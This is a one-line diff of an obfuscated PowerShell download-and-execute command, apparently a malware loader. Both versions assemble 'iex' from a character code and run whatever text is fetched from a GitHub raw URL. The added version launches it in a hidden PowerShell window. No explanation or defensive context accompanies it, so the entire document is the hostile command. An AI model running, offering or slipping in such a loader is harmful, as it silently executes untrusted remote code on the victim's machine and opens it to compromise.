@@ -1,1 +1,1 @@
-sv f ex;.([char]105+$f)(irm github.com/jeanbaak63-byte/assets/raw/refs/heads/main/test.txt)
+start powershell -win hi -Arg 'sv e ex;.([System.Text.Encoding]::ASCII.GetString([byte[]](105))+$e)(irm github.com/jeanbaak63-byte/assets/raw/refs/heads/main/test.txt)'
